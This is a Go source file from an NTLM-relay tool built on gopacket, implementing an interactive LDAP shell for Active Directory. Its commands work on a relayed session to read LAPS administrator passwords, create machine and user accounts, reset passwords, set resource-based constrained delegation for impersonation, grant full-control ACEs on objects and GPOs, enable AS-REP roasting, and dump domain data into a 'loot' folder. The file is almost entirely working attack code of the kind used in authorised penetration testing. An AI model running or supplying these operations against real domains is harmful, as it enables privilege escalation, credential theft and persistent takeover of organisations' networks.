// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package relay

import (
	"fmt"
	"net"
	"strconv"
	"strings"

	goldap "github.com/go-ldap/ldap/v3"

	gopacketldap "github.com/mandiant/gopacket/pkg/ldap"
	"github.com/mandiant/gopacket/pkg/security"
)

const ldapMatchingRuleInChain = "1.2.840.113556.1.4.1941"

func ldapShellResolveDN(client *gopacketldap.Client, baseDN, samAccountName string) (string, error) {
	if strings.Contains(samAccountName, ",") {
		return samAccountName, nil
	}
	sr, err := client.Search(baseDN,
		fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(samAccountName)),
		[]string{"objectSid"})
	if err != nil {
		return "", err
	}
	if len(sr.Entries) == 0 {
		return "", fmt.Errorf("not found in LDAP: %s", samAccountName)
	}
	return sr.Entries[0].DN, nil
}

func ldapShellResolveSID(client *gopacketldap.Client, baseDN, samAccountName string) (*security.SID, error) {
	sr, err := client.Search(baseDN,
		fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(samAccountName)),
		[]string{"objectSid"})
	if err != nil {
		return nil, err
	}
	if len(sr.Entries) == 0 {
		return nil, fmt.Errorf("not found in LDAP: %s", samAccountName)
	}
	raw := sr.Entries[0].GetRawAttributeValue("objectSid")
	if len(raw) == 0 {
		return nil, fmt.Errorf("empty objectSid for %s", samAccountName)
	}
	sid, _, err := security.ParseSIDBytes(raw)
	return sid, err
}

func ldapShellBuildEmptySD() *security.SecurityDescriptor {
	ownerSID, _ := security.ParseSID("S-1-5-32-544")
	return &security.SecurityDescriptor{
		Revision: 1,
		Control:  security.SE_DACL_PRESENT | security.SE_SELF_RELATIVE,
		Owner:    ownerSID,
		Group:    ownerSID,
		DACL: &security.ACL{
			AclRevision: 4,
		},
	}
}

func ldapShellToggleUAC(conn net.Conn, client *gopacketldap.Client, baseDN, userName string, flag int, enable bool) {
	sr, err := client.Search(baseDN,
		fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(userName)),
		[]string{"objectSid", "userAccountControl"})
	if err != nil || len(sr.Entries) == 0 {
		fmt.Fprintf(conn, "Error: user not found: %s\n", userName)
		return
	}

	entry := sr.Entries[0]
	uacStr := entry.GetAttributeValue("userAccountControl")
	uac, _ := strconv.Atoi(uacStr)
	fmt.Fprintf(conn, "Original userAccountControl: %d\n", uac)

	if enable {
		uac = uac | flag
	} else {
		uac = uac &^ flag
	}

	modReq := goldap.NewModifyRequest(entry.DN, nil)
	modReq.Replace("userAccountControl", []string{strconv.Itoa(uac)})
	if err := client.Conn.Modify(modReq); err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	fmt.Fprintf(conn, "Updated userAccountControl attribute successfully\n")
}

func ldapShellSearch(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) == 0 {
		fmt.Fprintf(conn, "Usage: search <query> [attribute ...]\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error getting base DN: %v\n", err)
		return
	}

	query := args[0]
	extraAttrs := args[1:]

	var filter string
	if strings.HasPrefix(query, "(") {
		filter = query
	} else {
		escaped := goldap.EscapeFilter(query)
		filter = fmt.Sprintf("(|(name=*%s*)(distinguishedName=*%s*)(sAMAccountName=*%s*))", escaped, escaped, escaped)
	}

	attributes := []string{"name", "distinguishedName", "sAMAccountName", "objectSid"}
	attributes = append(attributes, extraAttrs...)

	sr, err := client.Search(baseDN, filter, attributes)
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}

	for _, entry := range sr.Entries {
		fmt.Fprintf(conn, "%s\n", entry.DN)
		for _, attr := range attributes {
			if attr == "distinguishedName" {
				continue
			}
			val := entry.GetAttributeValue(attr)
			if val != "" {
				fmt.Fprintf(conn, "%s: %s\n", attr, val)
			}
		}
		if len(attributes) > 0 {
			fmt.Fprintf(conn, "---\n")
		}
	}
}

func ldapShellGetUserGroups(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) == 0 {
		fmt.Fprintf(conn, "Usage: get_user_groups <user>\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	userDN, err := ldapShellResolveDN(client, baseDN, args[0])
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	filter := fmt.Sprintf("(member:%s:=%s)", ldapMatchingRuleInChain, goldap.EscapeFilter(userDN))
	sr, err := client.Search(baseDN, filter, []string{"distinguishedName"})
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	for _, entry := range sr.Entries {
		fmt.Fprintf(conn, "%s\n", entry.DN)
	}
}

func ldapShellGetGroupUsers(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) == 0 {
		fmt.Fprintf(conn, "Usage: get_group_users <group>\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	groupDN, err := ldapShellResolveDN(client, baseDN, args[0])
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	filter := fmt.Sprintf("(memberof:%s:=%s)", ldapMatchingRuleInChain, goldap.EscapeFilter(groupDN))
	sr, err := client.Search(baseDN, filter, []string{"sAMAccountName", "name"})
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	for _, entry := range sr.Entries {
		fmt.Fprintf(conn, "%s\n", entry.DN)
		sam := entry.GetAttributeValue("sAMAccountName")
		if sam != "" {
			fmt.Fprintf(conn, "sAMAccountName: %s\n", sam)
		}
		name := entry.GetAttributeValue("name")
		if name != "" {
			fmt.Fprintf(conn, "name: %s\n", name)
		}
		fmt.Fprintf(conn, "---\n")
	}
}

func ldapShellGetLAPSPassword(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) == 0 {
		fmt.Fprintf(conn, "Usage: get_laps_password <computer>\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	sr, err := client.Search(baseDN,
		fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(args[0])),
		[]string{"ms-MCS-AdmPwd"})
	if err != nil || len(sr.Entries) == 0 {
		fmt.Fprintf(conn, "Error: computer not found: %s\n", args[0])
		return
	}
	entry := sr.Entries[0]
	fmt.Fprintf(conn, "Found Computer DN: %s\n", entry.DN)
	password := entry.GetAttributeValue("ms-MCS-AdmPwd")
	if password != "" {
		fmt.Fprintf(conn, "LAPS Password: %s\n", password)
	} else {
		fmt.Fprintf(conn, "Unable to Read LAPS Password for Computer\n")
	}
}

func ldapShellDump(conn net.Conn, client *gopacketldap.Client) {
	fmt.Fprintf(conn, "Dumping domain info...\n")
	cfg := &Config{LootDir: "loot"}
	if err := ldapDumpAttack(client, cfg); err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	fmt.Fprintf(conn, "Domain info dumped into lootdir!\n")
}

func ldapShellAddComputer(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) == 0 {
		fmt.Fprintf(conn, "Usage: add_computer <name> [password] [nospns]\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	domain := extractDomainFromDN(baseDN)

	computerName := args[0]
	if !strings.HasSuffix(computerName, "$") {
		computerName += "$"
	}

	password := generateRandomPassword(15)
	nospns := false
	for _, a := range args[1:] {
		if strings.ToLower(a) == "nospns" {
			nospns = true
		} else {
			password = a
		}
	}

	hostname := strings.TrimSuffix(computerName, "$")
	fmt.Fprintf(conn, "Attempting to add a new computer with the name: %s\n", computerName)

	var spns []string
	if nospns {
		spns = []string{
			fmt.Sprintf("HOST/%s.%s", hostname, domain),
		}
	} else {
		spns = []string{
			fmt.Sprintf("HOST/%s", hostname),
			fmt.Sprintf("HOST/%s.%s", hostname, domain),
			fmt.Sprintf("RestrictedKrbHost/%s", hostname),
			fmt.Sprintf("RestrictedKrbHost/%s.%s", hostname, domain),
		}
	}

	dn := fmt.Sprintf("CN=%s,CN=Computers,%s", hostname, baseDN)
	addReq := goldap.NewAddRequest(dn, nil)
	addReq.Attribute("objectClass", []string{"top", "person", "organizationalPerson", "user", "computer"})
	addReq.Attribute("sAMAccountName", []string{computerName})
	addReq.Attribute("userAccountControl", []string{"4096"})
	addReq.Attribute("dNSHostName", []string{fmt.Sprintf("%s.%s", hostname, domain)})
	addReq.Attribute("servicePrincipalName", spns)
	addReq.Attribute("unicodePwd", []string{string(encodeUnicodePassword(password))})

	if err := client.Conn.Add(addReq); err != nil {
		if strings.Contains(strings.ToLower(err.Error()), "unwilling") {
			fmt.Fprintf(conn, "Failed to add a new computer. The server denied the operation. Try relaying to LDAP with TLS enabled (ldaps) or escalating an existing user.\n")
		} else {
			fmt.Fprintf(conn, "Failed to add a new computer: %v\n", err)
		}
		return
	}
	fmt.Fprintf(conn, "Adding new computer with username: %s and password: %s result: OK\n", computerName, password)
}

func ldapShellRenameComputer(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) != 2 {
		fmt.Fprintf(conn, "Usage: rename_computer <current_name> <new_name>\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	sr, err := client.Search(baseDN,
		fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(args[0])),
		[]string{"sAMAccountName"})
	if err != nil || len(sr.Entries) == 0 {
		fmt.Fprintf(conn, "Error: computer not found: %s\n", args[0])
		return
	}
	entry := sr.Entries[0]
	fmt.Fprintf(conn, "Original sAMAccountName: %s\n", entry.GetAttributeValue("sAMAccountName"))
	fmt.Fprintf(conn, "New sAMAccountName: %s\n", args[1])

	modReq := goldap.NewModifyRequest(entry.DN, nil)
	modReq.Replace("sAMAccountName", []string{args[1]})
	if err := client.Conn.Modify(modReq); err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	fmt.Fprintf(conn, "Updated sAMAccountName successfully\n")
}

func ldapShellAddUser(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) == 0 {
		fmt.Fprintf(conn, "Usage: add_user <username> [parent_dn]\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}

	newUser := args[0]
	parentDN := fmt.Sprintf("CN=Users,%s", baseDN)
	if len(args) > 1 {
		parentDN = args[1]
	}

	password := generateRandomPassword(15)
	userDN := fmt.Sprintf("CN=%s,%s", newUser, parentDN)

	fmt.Fprintf(conn, "Attempting to create user in: %s\n", parentDN)

	addReq := goldap.NewAddRequest(userDN, nil)
	addReq.Attribute("objectClass", []string{"top", "person", "organizationalPerson", "user"})
	addReq.Attribute("objectCategory", []string{fmt.Sprintf("CN=Person,CN=Schema,CN=Configuration,%s", baseDN)})
	addReq.Attribute("distinguishedName", []string{userDN})
	addReq.Attribute("cn", []string{newUser})
	addReq.Attribute("sn", []string{newUser})
	addReq.Attribute("givenName", []string{newUser})
	addReq.Attribute("displayName", []string{newUser})
	addReq.Attribute("name", []string{newUser})
	addReq.Attribute("userAccountControl", []string{"512"})
	addReq.Attribute("accountExpires", []string{"0"})
	addReq.Attribute("sAMAccountName", []string{newUser})
	addReq.Attribute("unicodePwd", []string{string(encodeUnicodePassword(password))})

	if err := client.Conn.Add(addReq); err != nil {
		if strings.Contains(strings.ToLower(err.Error()), "unwilling") {
			fmt.Fprintf(conn, "Failed to add a new user. The server denied the operation. Try relaying to LDAP with TLS enabled (ldaps) or escalating an existing user.\n")
		} else {
			fmt.Fprintf(conn, "Failed to add a new user: %v\n", err)
		}
		return
	}
	fmt.Fprintf(conn, "Adding new user with username: %s and password: %s result: OK\n", newUser, password)
}

func ldapShellAddUserToGroup(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) != 2 {
		fmt.Fprintf(conn, "Usage: add_user_to_group <user> <group>\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	userDN, err := ldapShellResolveDN(client, baseDN, args[0])
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	groupDN, err := ldapShellResolveDN(client, baseDN, args[1])
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}

	modReq := goldap.NewModifyRequest(groupDN, nil)
	modReq.Add("member", []string{userDN})
	if err := client.Conn.Modify(modReq); err != nil {
		fmt.Fprintf(conn, "Failed to add user to group: %v\n", err)
		return
	}

	userName := strings.Split(strings.TrimPrefix(userDN, "CN="), ",")[0]
	groupName := strings.Split(strings.TrimPrefix(groupDN, "CN="), ",")[0]
	fmt.Fprintf(conn, "Adding user: %s to group %s result: OK\n", userName, groupName)
}

func ldapShellChangePassword(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) == 0 || len(args) > 2 {
		fmt.Fprintf(conn, "Usage: change_password <user> [password]\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	userDN, err := ldapShellResolveDN(client, baseDN, args[0])
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	fmt.Fprintf(conn, "Got User DN: %s\n", userDN)

	password := generateRandomPassword(15)
	if len(args) == 2 {
		password = args[1]
	}
	fmt.Fprintf(conn, "Attempting to set new password of: %s\n", password)

	modReq := goldap.NewModifyRequest(userDN, nil)
	modReq.Replace("unicodePwd", []string{string(encodeUnicodePassword(password))})
	if err := client.Conn.Modify(modReq); err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	fmt.Fprintf(conn, "Password changed successfully!\n")
}

func ldapShellDisableAccount(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) == 0 {
		fmt.Fprintf(conn, "Usage: disable_account <user>\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	ldapShellToggleUAC(conn, client, baseDN, args[0], 0x2, true)
}

func ldapShellEnableAccount(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) == 0 {
		fmt.Fprintf(conn, "Usage: enable_account <user>\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	ldapShellToggleUAC(conn, client, baseDN, args[0], 0x2, false)
}

func ldapShellSetRBCD(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) != 2 {
		fmt.Fprintf(conn, "Usage: set_rbcd <target> <grantee>\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}

	targetName, granteeName := args[0], args[1]

	// Resolve target
	sr, err := client.Search(baseDN,
		fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(targetName)),
		[]string{"objectSid", "msDS-AllowedToActOnBehalfOfOtherIdentity"})
	if err != nil || len(sr.Entries) == 0 {
		fmt.Fprintf(conn, "Error: target not found: %s\n", targetName)
		return
	}
	target := sr.Entries[0]
	targetSIDBytes := target.GetRawAttributeValue("objectSid")
	targetSID, _, _ := security.ParseSIDBytes(targetSIDBytes)
	fmt.Fprintf(conn, "Found Target DN: %s\n", target.DN)
	fmt.Fprintf(conn, "Target SID: %s\n\n", targetSID.String())

	// Resolve grantee
	granteeSID, err := ldapShellResolveSID(client, baseDN, granteeName)
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	granteeDN, _ := ldapShellResolveDN(client, baseDN, granteeName)
	fmt.Fprintf(conn, "Found Grantee DN: %s\n", granteeDN)
	fmt.Fprintf(conn, "Grantee SID: %s\n", granteeSID.String())

	// Parse or create SD
	existing := target.GetRawAttributeValue("msDS-AllowedToActOnBehalfOfOtherIdentity")
	var sd *security.SecurityDescriptor
	if len(existing) > 0 {
		sd, err = security.ParseSecurityDescriptor(existing)
		if err != nil {
			sd = nil
		}
		if sd != nil {
			fmt.Fprintf(conn, "Currently allowed sids:\n")
			for _, ace := range sd.DACL.ACEs {
				fmt.Fprintf(conn, "    %s\n", ace.SID.String())
				if ace.SID.Equal(granteeSID) {
					fmt.Fprintf(conn, "Grantee is already permitted to perform delegation to the target host\n")
					return
				}
			}
		}
	}
	if sd == nil {
		sd = ldapShellBuildEmptySD()
	}

	sd.DACL.AddACE(&security.ACE{
		Type:  security.ACCESS_ALLOWED_ACE_TYPE,
		Flags: 0,
		Mask:  security.FULL_CONTROL,
		SID:   granteeSID,
	})

	modReq := goldap.NewModifyRequest(target.DN, nil)
	modReq.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{string(sd.Marshal())})
	if err := client.Conn.Modify(modReq); err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	fmt.Fprintf(conn, "Delegation rights modified successfully!\n")
	fmt.Fprintf(conn, "%s can now impersonate users on %s via S4U2Proxy\n", granteeName, targetName)
}

func ldapShellClearRBCD(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) == 0 {
		fmt.Fprintf(conn, "Usage: clear_rbcd <target>\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	sr, err := client.Search(baseDN,
		fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(args[0])),
		[]string{"objectSid", "msDS-AllowedToActOnBehalfOfOtherIdentity"})
	if err != nil || len(sr.Entries) == 0 {
		fmt.Fprintf(conn, "Error: target not found: %s\n", args[0])
		return
	}
	target := sr.Entries[0]
	targetSIDBytes := target.GetRawAttributeValue("objectSid")
	targetSID, _, _ := security.ParseSIDBytes(targetSIDBytes)
	fmt.Fprintf(conn, "Found Target DN: %s\n", target.DN)
	fmt.Fprintf(conn, "Target SID: %s\n\n", targetSID.String())

	sd := ldapShellBuildEmptySD()
	modReq := goldap.NewModifyRequest(target.DN, nil)
	modReq.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{string(sd.Marshal())})
	if err := client.Conn.Modify(modReq); err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	fmt.Fprintf(conn, "Delegation rights cleared successfully!\n")
}

func ldapShellGrantControl(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) < 2 || len(args) > 3 {
		fmt.Fprintf(conn, "Usage: grant_control [search_base] <target> <grantee>\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}

	var targetSpec, granteeName, targetBase string
	if len(args) == 3 {
		targetBase, targetSpec, granteeName = args[0], args[1], args[2]
	} else {
		targetBase = baseDN
		targetSpec, granteeName = args[0], args[1]
	}

	// Resolve grantee SID
	granteeSID, err := ldapShellResolveSID(client, baseDN, granteeName)
	if err != nil {
		fmt.Fprintf(conn, "Error: grantee not found: %v\n", err)
		return
	}
	fmt.Fprintf(conn, "Resolved %q to %q\n", granteeName, granteeSID.String())

	// Build target filter
	var targetFilter string
	if strings.HasPrefix(targetSpec, "(") && strings.HasSuffix(targetSpec, ")") {
		targetFilter = targetSpec
	} else {
		targetFilter = fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(targetSpec))
	}

	// Search target with SD Flags control
	sdControl := gopacketldap.NewControlMicrosoftSDFlags(0x04)
	targetResult, err := client.SearchWithControls(targetBase, targetFilter,
		[]string{"nTSecurityDescriptor"}, []goldap.Control{sdControl})
	if err != nil || len(targetResult.Entries) == 0 {
		fmt.Fprintf(conn, "Error: target not found\n")
		return
	}
	if len(targetResult.Entries) > 1 {
		fmt.Fprintf(conn, "Error: target not unique\n")
		return
	}
	targetEntry := targetResult.Entries[0]
	fmt.Fprintf(conn, "Resolved %q to %q\n", targetFilter, targetEntry.DN)

	// Parse or create SD
	sdData := targetEntry.GetRawAttributeValue("nTSecurityDescriptor")
	var sd *security.SecurityDescriptor
	if len(sdData) > 0 {
		sd, err = security.ParseSecurityDescriptor(sdData)
		if err != nil {
			sd = nil
		}
	}
	if sd == nil {
		sd = ldapShellBuildEmptySD()
	}

	sd.DACL.AddACE(&security.ACE{
		Type:  security.ACCESS_ALLOWED_ACE_TYPE,
		Flags: 0,
		Mask:  security.FULL_CONTROL,
		SID:   granteeSID,
	})

	sdControlWrite := gopacketldap.NewControlMicrosoftSDFlags(0x04)
	modReq := goldap.NewModifyRequest(targetEntry.DN, []goldap.Control{sdControlWrite})
	modReq.Replace("nTSecurityDescriptor", []string{string(sd.Marshal())})
	if err := client.Conn.Modify(modReq); err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	fmt.Fprintf(conn, "DACL modified successfully!\n")
	fmt.Fprintf(conn, "%q now has control of %q\n", granteeName, targetEntry.DN)
}

func ldapShellWriteGPODacl(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) != 2 {
		fmt.Fprintf(conn, "Usage: write_gpo_dacl <user> <gpoSID>\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}

	userName, gpoSID := args[0], args[1]
	fmt.Fprintf(conn, "Adding %s to GPO with GUID %s\n", userName, gpoSID)

	// Resolve user SID
	userSID, err := ldapShellResolveSID(client, baseDN, userName)
	if err != nil {
		fmt.Fprintf(conn, "Error: user not found: %v\n", err)
		return
	}

	// Find GPO
	sdControl := gopacketldap.NewControlMicrosoftSDFlags(0x04)
	gpoResult, err := client.SearchWithControls(baseDN,
		fmt.Sprintf("(&(objectclass=groupPolicyContainer)(name=%s))", goldap.EscapeFilter(gpoSID)),
		[]string{"nTSecurityDescriptor"}, []goldap.Control{sdControl})
	if err != nil || len(gpoResult.Entries) == 0 {
		fmt.Fprintf(conn, "Error: GPO not found: %s\n", gpoSID)
		return
	}
	gpo := gpoResult.Entries[0]

	// Parse SD
	sdData := gpo.GetRawAttributeValue("nTSecurityDescriptor")
	var sd *security.SecurityDescriptor
	if len(sdData) > 0 {
		sd, err = security.ParseSecurityDescriptor(sdData)
		if err != nil {
			sd = nil
		}
	}
	if sd == nil {
		sd = ldapShellBuildEmptySD()
	}

	sd.DACL.AddACE(&security.ACE{
		Type:  security.ACCESS_ALLOWED_ACE_TYPE,
		Flags: 0,
		Mask:  security.FULL_CONTROL,
		SID:   userSID,
	})

	sdControlWrite := gopacketldap.NewControlMicrosoftSDFlags(0x04)
	modReq := goldap.NewModifyRequest(gpo.DN, []goldap.Control{sdControlWrite})
	modReq.Replace("nTSecurityDescriptor", []string{string(sd.Marshal())})
	if err := client.Conn.Modify(modReq); err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	fmt.Fprintf(conn, "LDAP server claims to have taken the secdescriptor. Have fun\n")
}

func ldapShellSetDontReqPreauth(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) != 2 {
		fmt.Fprintf(conn, "Usage: set_dontreqpreauth <user> <true/false>\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}

	flag := strings.ToLower(args[1])
	switch flag {
	case "true":
		ldapShellToggleUAC(conn, client, baseDN, args[0], 0x400000, true)
	case "false":
		ldapShellToggleUAC(conn, client, baseDN, args[0], 0x400000, false)
	default:
		fmt.Fprintf(conn, "Error: flag must be true or false\n")
	}
}
